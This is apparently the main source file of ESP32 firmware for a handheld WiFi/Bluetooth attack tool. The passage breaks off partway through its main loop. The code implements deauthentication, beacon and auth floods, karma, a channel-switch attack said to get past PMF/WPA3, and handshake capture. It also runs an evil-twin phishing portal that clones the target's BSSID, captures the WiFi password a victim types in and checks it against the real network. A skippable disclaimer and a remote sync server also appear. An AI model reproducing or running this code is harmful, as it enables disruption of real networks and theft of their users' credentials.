#include <Arduino.h>
#include <WiFi.h>
#include <TFT_eSPI.h>
#include <esp_wifi.h>
#include <ping/ping_sock.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Preferences.h>
#include <LittleFS.h>
#include <ArduinoOTA.h>
#include <HTTPClient.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#include "disclaimer.h"
#include "attack_engine.h"
#include "karma.h"
#include "templates.h"
#include "bt_spam.h"
#include "state_machine.h"
#include "wifi_state.h"
#include "ui_helpers.h"
#include "ui_icons.h"



TFT_eSPI tft = TFT_eSPI();
Preferences prefs;
Preferences apPrefs;

#include "pins.h"
#define FW_VERSION "3.1"
// Kredensial opsional dari src/secrets.h (file lokal, TIDAK di-commit).
#if __has_include("secrets.h")
  #include "secrets.h"
#endif

#ifndef NISKALA_WIFI_SSID
  #define NISKALA_WIFI_SSID ""
#endif
#ifndef NISKALA_WIFI_PASS
  #define NISKALA_WIFI_PASS ""
#endif
#ifndef NISKALA_SYNC_API_KEY
  #define NISKALA_SYNC_API_KEY ""
#endif


const int MAX_VERIFY_ATTEMPTS = 5;
const unsigned long VERIFY_TIMEOUT_MS = 6000;
const unsigned long RELEASE_DELAY_MS = 2000;
const unsigned long SUCCESS_HOLD_MS = 4000;

State currentState = MAIN_MENU;

#include "web_remote.h"
#include "recon.h"
#include "cloud.h"
#include "ble_scan.h"
#include "ota.h"
#include "macro.h"
#include "client_monitor.h"
#include "cli.h"
#include "eapol.h"
#include "smart_attack.h"
#include "allowlist.h"
#include "config_store.h"
#include "web_handlers.h"
#include "attack_control.h"
#include "board_hal.h"
#include "wardriving.h"
#include "ui_screens.h"
#include "telemetry.h"

int menuSelection = 0;
int menuScrollPos = 0;
extern const int MENU_COUNT = 21;
const char* menuItems[] = {
  "DEAUTH MANUAL",
  "EVIL TWIN",
  "BEACON SPAM",
  "PROBE SNIFF",
  "GLOBAL DEAUTH",
  "AUTH FLOOD",
  "BLUETOOTH SPAM",
  "PASSWORD",
  "KARMA ATTACK",
  "CSA ATTACK",
  "WEB REMOTE",
  "OTA UPDATE",
  "BLE SCAN",
  "CLOUD SYNC",
  "MACRO",
  "CLIENT MONITOR",
  "NETWORK RECON",
  "AP WIFI",
  "EAPOL CAPTURE",
  "SMART ATTACK",
  "PACKET MONITOR"
};

volatile AttackMode g_attackMode = ATK_IDLE;
volatile uint32_t g_packetsSent = 0;
volatile uint32_t g_txErrors = 0;
portMUX_TYPE g_txMux = portMUX_INITIALIZER_UNLOCKED;
uint8_t g_originalApMac[6] = {0,0,0,0,0,0};
volatile bool g_victimFound = false;
uint8_t g_victimMAC[6] = {0};
uint8_t g_targetBSSID[6] = {0};
volatile uint8_t g_targetChannel = 1;
char g_csaTargetSSID[33] = {0};

// Parameter serangan runtime (diubah via Web Remote, disimpan di NVS)
int cfg_deauth_burst = 5;
int cfg_auth_burst = 20;
int cfg_hop_interval_ms = 120;
int cfg_beacon_hop_ms = 100;
int cfg_deauth_reason = 0;
String cfg_wifi_ssid = NISKALA_WIFI_SSID;
String cfg_wifi_pass = NISKALA_WIFI_PASS;
String cfg_server_url = "https://niskalasys.my.id/sync.php";
String cfg_template_url = "https://niskalasys.my.id/template.html";
String g_customTemplate = "";
bool useCustomTemplate = false;
int cfg_autosync_min = 0;
unsigned long lastAutoSync = 0;


unsigned long evilTwinStartTime = 0;
bool g_evilTwinCoop = false;

ProbeEntry g_probeLog[PROBE_LOG_SIZE];
volatile int g_probeLogHead = 0;
volatile int g_probeLogCount = 0;
portMUX_TYPE g_probeLogMux = portMUX_INITIALIZER_UNLOCKED;

// Karma data
KarmaSSIDEntry g_karmaSSIDs[KARMA_MAX_SSIDS];
int g_karmaSSIDCount = 0;
KarmaClientEntry g_karmaClients[KARMA_MAX_CLIENTS];
int g_karmaClientCount = 0;
volatile uint32_t g_karmaResponses = 0;
portMUX_TYPE g_karmaMux = portMUX_INITIALIZER_UNLOCKED;
portMUX_TYPE g_stateMux = portMUX_INITIALIZER_UNLOCKED;
volatile bool g_karmaActiveMode = true;

// Karma UI state
bool isKarmaRunning = false;
unsigned long karmaScanStart = 0;
int karmaSelection = 0;
int karmaScrollPos = 0;

bool isDeauthRunning = false;
bool isEvilTwinRunning = false;
bool isBeaconRunning = false;
bool isProbeRunning = false;
bool isGlobalDeauthRunning = false;
bool isAuthFloodRunning = false;
bool isBTSpamRunning = false;
bool isCSARunning = false;             // [CSA]
bool isWebRemoteRunning = false;
bool g_pmfShowResult = false;
unsigned long g_pmfShowUntil = 0;
bool isMacroRunning = false;
int macroIndex = 0;
int macroPhase = 0;
int macroSelection = 0;
unsigned long macroPhaseStart = 0;

// Screensaver (dim + particle orbit)
bool screensaverActive = false;
unsigned long lastActivity = 0;
unsigned long lastScreensaverDraw = 0;
int screensaverFrame = 0;
#define SCREENSAVER_IDLE_MS 45000
#define BL_DIM 51
#define BL_FULL 255
bool isClientMonitorRunning = false;
int clientSelection = 0;
int clientScroll = 0;
ClientEntry g_clients[CLIENT_MAX];
int g_clientCount = 0;
portMUX_TYPE g_clientMux = portMUX_INITIALIZER_UNLOCKED;

#define RECON_MAX_HOSTS 20
#define RECON_MAX_PORTS 14
#define MAX_AP_WIFI 20
#define RECON_PHASE_CONNECTING 0
#define RECON_PHASE_SWEEP 1
#define RECON_PHASE_HOST_LIST 2
#define RECON_PHASE_PORT_SCAN 3
#define RECON_PHASE_BANNER 4
#define RECON_PHASE_PORT_RESULT 5
IPAddress g_reconHosts[RECON_MAX_HOSTS];
int g_reconHostCount = 0;
int g_reconSelection = 0;
int g_reconScroll = 0;
int g_reconPhase = RECON_PHASE_HOST_LIST;
int g_reconOpenPorts[RECON_MAX_PORTS];
int g_reconOpenPortCount = 0;
IPAddress g_reconSelectedIP;
bool isReconRunning = false;
int g_reconSelectedAuth = -1;
uint32_t g_reconFirst = 0;
uint32_t g_reconLast = 0;
uint32_t g_reconNext = 0;
uint32_t g_reconTotal = 0;
uint32_t g_reconScanned = 0;
unsigned long g_reconConnectStart = 0;
int g_reconPortIndex = 0;
int g_reconBannerIndex = 0;
IPAddress g_reconLocalIP;
IPAddress g_reconGateway;
IPAddress g_reconSubnet;
char g_reconBanners[RECON_MAX_PORTS][40];
WiFiClient g_reconClient;


bool transientActive = false;
unsigned long transientUntil = 0;
uint8_t transientMode = 0;
String targetSSID = "";
int apCount = 0;
int selectedIdx = 0;
int g_scanPendingMenu = -1;
int g_scanFrame = 0;
unsigned long g_scanLastDraw = 0;
int apScrollPos = 0;

int selectedTemplateIdx = 0;
int templateSelection = 0;
int evilTwinModeSelection = 0;

int viewSelection = 0;
int viewScrollPos = 0;
bool confirmDeleteAll = false;
unsigned long lastDeletePress = 0;
int apWifiSelection = 0;
int apWifiScrollPos = 0;
bool confirmApWifiDelete = false;
unsigned long lastApWifiDeletePress = 0;

DNSServer dnsServer;
WebServer server(80);
String capturedEmail = "";
String capturedPass = "";
bool isReleasing = false;
bool isVerifying = false;
bool verificationResult = false;
unsigned long releaseTimer = 0;
unsigned long verifyStart = 0;
const byte DNS_PORT = 53;

int verifyState = 0;
unsigned long g_webAuthFailCount = 0;
unsigned long g_webAuthLockUntil = 0;
String g_lang = "id";
int verifyAttempts = 0;
unsigned long releaseAfterSuccess = 0;

TaskHandle_t attackTaskHandle = NULL;

// ═══════════════════════════════════════════════
// ------------------------------------------------------------------
// Password vault: reset level UI tetap di sini, logika NVS di config_store.
// ------------------------------------------------------------------
void deleteAllPasswordsFromNVS() {
  prefs.clear();
  viewSelection = 0; viewScrollPos = 0;
}
void stopEvilTwin();

String getBestDiscoveredSSID() {
  String best = "";
  int bestCount = 0;

  portENTER_CRITICAL(&g_probeLogMux);
  for (int i = 0; i < g_probeLogCount; i++) {
    int idx = (g_probeLogHead - g_probeLogCount + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    if (g_probeLog[idx].ssid[0] != 0 && (int)g_probeLog[idx].count > bestCount) {
      best = String(g_probeLog[idx].ssid);
      bestCount = g_probeLog[idx].count;
    }
  }
  portEXIT_CRITICAL(&g_probeLogMux);

  for (int i = 0; i < g_karmaSSIDCount; i++) {
    if (g_karmaSSIDs[i].ssid[0] != 0 && (int)g_karmaSSIDs[i].probeCount > bestCount) {
      best = String(g_karmaSSIDs[i].ssid);
      bestCount = g_karmaSSIDs[i].probeCount;
    }
  }
  return best;
}

void startEvilTwinWithDeauth() {
  radioSetMode(RADIO_AP_STA);
  delay(100);
  // Clone BSSID target agar AP palsu benar-benar "twin" (bukan MAC original).
  // Mode CO-OP (2 board): JANGAN clone MAC, supaya deauth dari board jammer
  // tidak ikut memutus korban yang sudah terhubung ke AP palsu ini.
  if (!g_evilTwinCoop) {
    if (g_targetBSSID[0] != 0 || g_targetBSSID[1] != 0 || g_targetBSSID[2] != 0 ||
        g_targetBSSID[3] != 0 || g_targetBSSID[4] != 0 || g_targetBSSID[5] != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] clone MAC target gagal (%d), pakai MAC existing\n", macErr);
      }
      delay(50);
    }
  } else {
    restoreOriginalApMac();
    Serial.println("[EVIL TWIN] Mode CO-OP 2 BOARD: pakai MAC sendiri, tanpa deauth internal");
  }

  String safeSSID = targetSSID;
  if (safeSSID.length() == 0) {
    safeSSID = getBestDiscoveredSSID();
    if (safeSSID.length() == 0) {
      safeSSID = "Free_WiFi";
    } else {
      Serial.printf("[EVIL TWIN] SSID hidden -> pakai hasil Probe/Karma: %s\n", safeSSID.c_str());
    }
  }

  bool apSuccess = WiFi.softAP(safeSSID.c_str(), NULL, g_targetChannel, 0, 4);
  if (!apSuccess) {
    Serial.println("[ERROR] Gagal membuat AP Palsu!");
    stopEvilTwin();
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }
  delay(250);

  uint8_t fakeMac[6];
  esp_wifi_get_mac(WIFI_IF_AP, fakeMac);
  Serial.printf("[EVIL TWIN] Fake AP: SSID=%s MAC=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                safeSSID.c_str(),
                fakeMac[0], fakeMac[1], fakeMac[2], fakeMac[3], fakeMac[4], fakeMac[5],
                g_targetChannel);

  IPAddress IP = WiFi.softAPIP();
  dnsServer.start(DNS_PORT, "*", IP);
  server.begin();

  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);

  resetPacketCounters();
  setVictimFound(false);
  isReleasing = false;
  isVerifying = false;
  isEvilTwinRunning = true;
  setAttackMode(ATK_EVIL_TWIN);
  evilTwinStartTime = millis();

  Serial.printf("Evil Twin Started. Target BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d (attempt %d/%d)\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel,
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
}
void stopEvilTwin() {
  isEvilTwinRunning = false;
  isReleasing = false;
  isVerifying = false;
  verifyState = 0;
  useCustomTemplate = false;
  setAttackMode(ATK_IDLE);
  server.stop();
  dnsServer.stop();
  resetWifiStateAfterAttack();
}

// Verification
// ═══════════════════════════════════════════════
void beginVerification() {
  isReleasing = false;
  isVerifying = true;
  verifyState = 1;
  verifyStart = millis();
  Serial.printf("[VERIFY] Attempt %d/%d starting\n",
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
  esp_wifi_set_promiscuous(false);
  setAttackMode(ATK_IDLE);
  WiFi.disconnect();
  delay(100);
  WiFi.begin(targetSSID.c_str(), capturedPass.c_str(), g_targetChannel, g_targetBSSID);
}

void updateVerification() {
  if (!isVerifying) return;

  if (WiFi.status() == WL_CONNECTED) {
    verificationResult = true;
    WiFi.disconnect();
    updatePasswordVerification(true);
    isVerifying = false;
    verifyAttempts = 0;
    verifyState = 2;
    releaseAfterSuccess = millis() + SUCCESS_HOLD_MS;
    Serial.println("[VERIFY] PASSWORD BENAR");
    return;
  }

  if (millis() - verifyStart > VERIFY_TIMEOUT_MS) {
    WiFi.disconnect();
    updatePasswordVerification(false);
    isVerifying = false;
    verifyAttempts++;

    Serial.printf("[VERIFY] Attempt %d/%d FAILED\n",
                  verifyAttempts, MAX_VERIFY_ATTEMPTS);

    if (verifyAttempts >= MAX_VERIFY_ATTEMPTS) {
      verifyState = 0;
      verifyAttempts = 0;
      stopEvilTwin();
      tft.fillScreen(TFT_BLACK);
      drawHeader("MAX PERCOBAAN", TFT_RED);
      tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 40); tft.println("5x password salah.");
      tft.setCursor(10, 60); tft.println("Target dilepas.");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 85); tft.println("Kembali ke menu...");
      transientActive = true;
      transientUntil = millis() + 2500;
      transientMode = 1;
      return;
    }

    verifyState = 3;
    isReleasing = false;
    esp_wifi_set_promiscuous(true);
    setAttackMode(ATK_EVIL_TWIN);

    tft.fillScreen(TFT_BLACK);
    drawHeader("PASSWORD SALAH", TFT_RED);
    tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Password salah.");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 62);
    tft.print("Percobaan: "); tft.print(verifyAttempts);
    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 85); tft.println("Target input ulang...");
    transientActive = true;
    transientUntil = millis() + 1500;
    transientMode = 2;
    return;
  }
}

// ═══════════════════════════════════════════════
// Navigation
// ═══════════════════════════════════════════════


void handleAPListNavigation() {
  if (btnTopPressed()) {
    delay(200);
    selectedIdx++;
    if (selectedIdx > apCount) selectedIdx = 0;
    drawAPList();
  }
  if (btnBottomPressed()) {
    delay(200);
    if (selectedIdx == apCount) {
      currentState = MAIN_MENU; drawMainMenu();
    } else {
      memcpy(g_targetBSSID, WiFi.BSSID(selectedIdx), 6);
      g_targetChannel = WiFi.channel(selectedIdx);
      targetSSID = WiFi.SSID(selectedIdx);

      if (currentState == RECON_AP_SELECT) {
        g_reconSelectedAuth = (int)WiFi.encryptionType(selectedIdx);
        currentState = RECON;
        startNetworkRecon();
        while (btnBottomPressed()) delay(50);
        return;
      }

      if (currentState == AP_LIST_CLIENT) {
        currentState = CLIENT_MONITOR_RUNNING;
        startClientMonitor();
        drawClientMonitor();
        while (btnBottomPressed()) delay(50);
        return;
      }
      if (currentState == AP_LIST_CSA) {
        currentState = CSA_RUNNING;
        startCSAAttack();
        drawCSARunning(0);
        while (btnBottomPressed()) delay(50);
        return;
      }
      if (currentState == AP_LIST_EAPOL) {
        currentState = EAPOL_CAPTURE_RUNNING;
        startEapolCapture();
        while (btnBottomPressed()) delay(50);
        return;
      }

      if (currentState == AP_LIST_SMART) {
        currentState = SMART_PROFILE;
        drawSmartProfile();
        while (btnBottomPressed()) delay(50);
        return;
      }

      // [PATCH 2] PMF terdeteksi → tawarkan CSA
      if (detectPMF(selectedIdx)) {
        tft.fillScreen(TFT_BLACK);
        drawHeader("TARGET PMF/WPA3", TFT_ORANGE);
        tft.setTextFont(2); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setCursor(10, 30); tft.println("Target pakai PMF/WPA3.");
        tft.setCursor(10, 48); tft.println("Deauth TIDAK berhasil.");
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.setCursor(10, 70); tft.println("Gunakan CSA Attack —");
        tft.setCursor(10, 88); tft.println("tembus PMF via beacon");
        tft.setCursor(10, 106); tft.println("channel switch sah.");
        drawFooter("ATAS=Batal | BAWAH=CSA");

        while (!btnTopPressed() && !btnBottomPressed()) {
      if (Serial.available()) { while (Serial.available()) Serial.read(); break; } // bypass via serial
      delay(50);
    }
        delay(300);

        if (btnBottomPressed()) {
          currentState = CSA_RUNNING;
          startCSAAttack();
          drawCSARunning(0);
          while (btnBottomPressed()) delay(50);
        } else {
          currentState = MAIN_MENU;
          drawMainMenu();
        }
        return;
      }
      if (currentState == AP_LIST_DEAUTH) {
        currentState = DEAUTH_MENU;
        startDeauthEngine();
        drawDeauthMenu();
      } else if (currentState == AP_LIST_EVIL_TWIN) {
        currentState = EVIL_TWIN_MODE_SELECT;
        evilTwinModeSelection = 0;
        drawEvilTwinModeSelect();
      } else if (currentState == AP_LIST_AUTH_FLOOD) {
        currentState = AUTH_FLOOD_RUNNING;
        startAuthFlood();
        drawAuthFlood(0);
      }
    }
  }
}

void handleTemplateSelect() {
  if (btnTopPressed()) {
    delay(200);
    templateSelection = (templateSelection + 1) % TEMPLATE_COUNT;
    drawTemplateSelect();
  }
  if (btnBottomPressed()) {
    delay(200);
    if (templateSelection == 5) {
      currentState = FETCH_TEMPLATE;
      startFetchCustomTemplate();
      while (btnBottomPressed()) delay(50);
      return;
    } else {
      selectedTemplateIdx = templateSelection;
      useCustomTemplate = false;
      currentState = EVIL_TWIN_RUNNING;
      verifyAttempts = 0;
      verifyState = 0;
      startEvilTwinWithDeauth();
      drawEvilTwinRunning(0);
    }
  }
}

void handleEvilTwinModeSelect() {
  if (btnTopPressed()) {
    delay(200);
    evilTwinModeSelection = (evilTwinModeSelection + 1) % 2;
    drawEvilTwinModeSelect();
  }
  if (btnBottomPressed()) {
    delay(200);
    g_evilTwinCoop = (evilTwinModeSelection == 1);
    currentState = TEMPLATE_SELECT;
    templateSelection = 0;
    drawTemplateSelect();
  }
}

void handleKarmaResults() {
  if (btnTopPressed()) {
    delay(200);
    karmaSelection++;
    if (karmaSelection > g_karmaSSIDCount) karmaSelection = 0;
    if (karmaSelection >= karmaScrollPos + 4) karmaScrollPos = karmaSelection - 3;
    else if (karmaSelection < karmaScrollPos) karmaScrollPos = karmaSelection;
    drawKarmaResults();
  }
  if (btnBottomPressed()) {
    delay(200);

    if (karmaSelection >= g_karmaSSIDCount) {
      karmaSelection = 0;
      karmaScrollPos = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }

    String selectedSSID = String(g_karmaSSIDs[karmaSelection].ssid);
    int probes = g_karmaSSIDs[karmaSelection].probeCount;
    Serial.printf("[KARMA] Selected: %s (%d probes)\n", selectedSSID.c_str(), probes);

    tft.fillScreen(TFT_BLACK);
    drawHeader("MENCARI AP ASLI...", TFT_ORANGE);
    tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 50);
    tft.print("SSID: "); tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.println(selectedSSID.substring(0, 20));
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 80); tft.println("Scanning...");

    uint8_t foundBSSID[6] = {0};
    uint8_t foundChannel = 1;
    bool found = false;

    delay(100);
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
      if (WiFi.SSID(i) == selectedSSID) {
        memcpy(foundBSSID, WiFi.BSSID(i), 6);
        foundChannel = WiFi.channel(i);
        found = true;
        break;
      }
    }

    memcpy(g_targetBSSID, foundBSSID, 6);
    g_targetChannel = foundChannel;
    targetSSID = selectedSSID;

    if (found) {
      Serial.printf("[KARMA] Found AP: BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                    g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                    g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                    g_targetChannel);
    } else {
      Serial.printf("[KARMA] AP not found — Evil Twin without deauth target\n");
    }

    verifyAttempts = 0;
    verifyState = 0;
    g_evilTwinCoop = false;
    currentState = EVIL_TWIN_RUNNING;
    startEvilTwinWithDeauth();
    drawEvilTwinRunning(0);
  }
}

void startApScan(int pendingMenu) {
  g_scanPendingMenu = pendingMenu;
  g_scanFrame = 0;
  g_scanLastDraw = 0;
  currentState = AP_SCANNING;
  tft.fillScreen(TFT_BLACK);
  drawScanAnimation(0);
  WiFi.scanNetworks(true, true);
}

void apScanTick() {
  int n = WiFi.scanComplete();
  if (n >= 0) {
    apCount = n;
    int menu = g_scanPendingMenu;
    g_scanPendingMenu = -1;
    if (menu == 0) { currentState = AP_LIST_DEAUTH; }
    else if (menu == 1) { currentState = AP_LIST_EVIL_TWIN; }
    else if (menu == 5) { currentState = AP_LIST_AUTH_FLOOD; }
    else if (menu == 9) { currentState = AP_LIST_CSA; }
    else if (menu == 15) { currentState = AP_LIST_CLIENT; }
    else if (menu == 16) { currentState = RECON_AP_SELECT; }
    else if (menu == 18) { currentState = AP_LIST_EAPOL; }
    else if (menu == 19) { currentState = AP_LIST_SMART; }
    else { currentState = MAIN_MENU; }
    selectedIdx = 0; apScrollPos = 0;
    if (apCount > 0) drawAPList();
    else {
      tft.fillScreen(TFT_BLACK);
      drawHeader("NO WIFI FOUND", TFT_RED);
      delay(250);
      drawMainMenu();
      currentState = MAIN_MENU;
    }
  } else if (n == -2) {
    apCount = 0;
    g_scanPendingMenu = -1;
    currentState = MAIN_MENU;
    drawMainMenu();
  } else if (btnTopPressed() || btnBottomPressed()) {
    WiFi.scanDelete();
    apCount = -1;
    g_scanPendingMenu = -1;
    delay(200);
    currentState = MAIN_MENU;
    drawMainMenu();
  } else if (millis() - g_scanLastDraw > 60) {
    drawScanAnimation(g_scanFrame++);
    g_scanLastDraw = millis();
  }
}

// ═══════════════════════════════════════════════
// Disclaimer
// ═══════════════════════════════════════════════
void showDisclaimerFlow() {
  while (true) {
    drawDisclaimerScreen(tft, "v" FW_VERSION);
    while (!btnTopPressed() && !btnBottomPressed()) {
      if (Serial.available()) { while (Serial.available()) Serial.read(); break; } // bypass via serial
      delay(50);
    }
    delay(300);
    drawConfirmationScreen(tft);
    bool cancelled = false;
    while (true) {
      if (btnTopPressed()) { delay(300); cancelled = true; break; }
      if (btnBottomPressed()) { delay(300); break; }
      if (Serial.available()) { while (Serial.available()) Serial.read(); break; } // bypass via serial
      delay(50);
    }
    if (!cancelled) return;
  }
}

// ═══════════════════════════════════════════════
// Setup
// ═══════════════════════════════════════════════


void setup() {
  Serial.begin(115200);
  randomSeed(esp_random());
  delay(300);
  Serial.println();
  Serial.println("==== NISKALA v" FW_VERSION " ====");
  Serial.printf("Chip : %s rev %d\n", ESP.getChipModel(), ESP.getChipRevision());
  Serial.printf("Heap : %u bytes\n", ESP.getFreeHeap());

  pinMode(BTN_TOP, INPUT_PULLUP);
  pinMode(BTN_BOTTOM, INPUT_PULLUP);
  analogSetPinAttenuation(BAT_PIN, ADC_11db);
  prefs.begin("deauther", false);
  apPrefs.begin("deauther_ap", false);

  cfg_deauth_burst = prefs.getInt("cfg_deauth", 5);
  cfg_auth_burst = prefs.getInt("cfg_auth", 20);
  cfg_hop_interval_ms = prefs.getInt("cfg_hop", 120);
  cfg_beacon_hop_ms = prefs.getInt("cfg_beacon", 100);
  cfg_deauth_reason = prefs.getInt("cfg_reason", 0);
  { String _s = prefs.getString("wifi_ssid", ""); if (_s.length() > 0) cfg_wifi_ssid = _s; }
  { String _s = prefs.getString("wifi_pass", ""); if (_s.length() > 0) cfg_wifi_pass = _s; }
  { String _s = prefs.getString("srv_url", ""); if (_s.length() > 0) cfg_server_url = _s; }
  { String _s = prefs.getString("tpl_url", ""); if (_s.length() > 0) cfg_template_url = _s; }
  cfg_autosync_min = prefs.getInt("autosync", 0);
  lastAutoSync = millis();

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleNotFound);
  setupWebRemote();

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);

  Serial.println("[1/4] Splash...");
#if NISKALA_HAS_TFT
  drawElegantSplash();
#endif
  Serial.println("[2/4] Disclaimer...");
#if NISKALA_HAS_TFT
  showDisclaimerFlow();
#endif
  radioSetMode(RADIO_AP_STA);
  esp_wifi_get_mac(WIFI_IF_AP, g_originalApMac);
  radioSetMode(RADIO_STA);
  WiFi.disconnect();

  Serial.println("[3/4] Start attack task...");
  xTaskCreatePinnedToCore(
    attackTask, "attack", 4096, NULL, 2, &attackTaskHandle, 0
  );

#if NISKALA_HAS_TFT
  Serial.println("[4/4] Draw main menu...");
  drawMainMenu();
#endif
  Serial.println("Setup selesai, heap tersisa: " + String(ESP.getFreeHeap()));
  Serial.println("Ketik 'help' untuk CLI (Serial Monitor 115200).");
  logEvent("BOOT v" FW_VERSION " heap=%u", (unsigned)ESP.getFreeHeap());
  lastActivity = millis();
}

// ═══════════════════════════════════════════════
// Loop
// ═══════════════════════════════════════════════
static unsigned long lastUI = 0;
static int animFrame = 0;

void loop() {
  handleSerialCLI();
  wardrivingLoop();

#if NISKALA_HAS_TFT
  // ---- Screensaver (dim + particle orbit) ----
  bool anyBtn = (btnTopPressed() || btnBottomPressed());
  if (screensaverActive) {
    if (anyBtn) {
      screensaverActive = false;
      setBacklight(BL_FULL);
      lastActivity = millis();
      if (currentState == MAIN_MENU) drawMainMenu();
      delay(200);
      return;
    }
    if (millis() - lastScreensaverDraw > 70) {
      drawButterflyScreensaver(screensaverFrame++);
      lastScreensaverDraw = millis();
    }
    return;
  }
  if (anyBtn) lastActivity = millis();
  if (currentState == MAIN_MENU && millis() - lastActivity > SCREENSAVER_IDLE_MS) {
    screensaverActive = true;
    screensaverFrame = 0;
    setBacklight(BL_DIM);
    drawButterflyScreensaver(0);
    return;
  }
  // ---- end screensaver ----
#endif // NISKALA_HAS_TFT

  // Non-blocking transient info (verification result hold)
  if (transientActive) {
    if (transientMode == 2) {
      dnsServer.processNextRequest();
      server.handleClient();
    }
    if (millis() > transientUntil) {
      transientActive = false;
      if (transientMode == 1) {
        currentState = MAIN_MENU;
        drawMainMenu();
      } else {
        drawEvilTwinRunning(0);
      }
    }
    return;
  }

  // ── KARMA_SCAN ──
  if (currentState == KARMA_SCAN && isKarmaRunning) {
    if (millis() - lastUI > 200) { drawKarmaScan(animFrame++); lastUI = millis(); }

    if (millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
      stopKarmaScan();
      sortKarmaSSIDs();
      karmaSelection = 0;
      karmaScrollPos = 0;
      currentState = KARMA_RESULTS;
      drawKarmaResults();
      return;
    }

    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopKarmaScan();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // ── KARMA_RESULTS ──
  if (currentState == KARMA_RESULTS) {
    handleKarmaResults();
    return;
  }

  // ── EVIL_TWIN: success ──
  if (verifyState == 2 && isEvilTwinRunning) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (millis() - lastUI > 400) {
      tft.fillScreen(TFT_BLACK);
      drawHeader("PASSWORD BENAR!", TFT_GREEN);
      tft.setTextFont(2); tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setCursor(10, 40); tft.println("Verifikasi sukses.");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 62); tft.println("Target akan dilepas");
      int remain = (releaseAfterSuccess > millis()) ?
                   ((releaseAfterSuccess - millis()) / 1000 + 1) : 0;
      tft.setCursor(10, 82);
      tft.print("dalam "); tft.print(remain); tft.println(" detik...");
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.setCursor(10, 102); tft.print("Pass:");
      drawWrapped(capturedPass, 70, 102, 160, TFT_WHITE, 14);
      lastUI = millis();
    }
    if (millis() > releaseAfterSuccess) {
      stopEvilTwin();
      verifyState = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // ── EVIL_TWIN: verifying ──
  if (isVerifying) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    updateVerification();
    if (millis() - lastUI > 200) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
    return;
  }

  // ── EVIL_TWIN: normal ──
  if (isEvilTwinRunning) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    if (isReleasing) {
      if (millis() - releaseTimer > RELEASE_DELAY_MS) {
        beginVerification();
        return;
      }
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (millis() - lastUI > 150) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
    return;
  }

  // ── CSA ──
  if (currentState == CSA_RUNNING && isCSARunning) {
    if (millis() - lastUI > 180) { drawCSARunning(animFrame++); lastUI = millis(); }
  }

  // ── Fitur lain ──
#if NISKALA_HAS_TFT
  if (currentState == DEAUTH_MENU && isDeauthRunning) {
    if (millis() - lastUI > 200) { drawDeauthMenu(); lastUI = millis(); }
  }
  if (currentState == GLOBAL_DEAUTH && isGlobalDeauthRunning) {
    if (millis() - lastUI > 150) { drawGlobalDeauth(animFrame++); lastUI = millis(); }
  }
  if (currentState == AUTH_FLOOD_RUNNING && isAuthFloodRunning) {
    if (millis() - lastUI > 200) { drawAuthFlood(animFrame++); lastUI = millis(); }
  }
  if (currentState == BEACON_SPAM && isBeaconRunning) {
    if (millis() - lastUI > 180) { drawBeaconSpam(animFrame++); lastUI = millis(); }
  }
  if (currentState == PROBE_SNIFF && isProbeRunning) {
    if (millis() - lastUI > 250) { drawProbeSniff(animFrame++); lastUI = millis(); }
  }
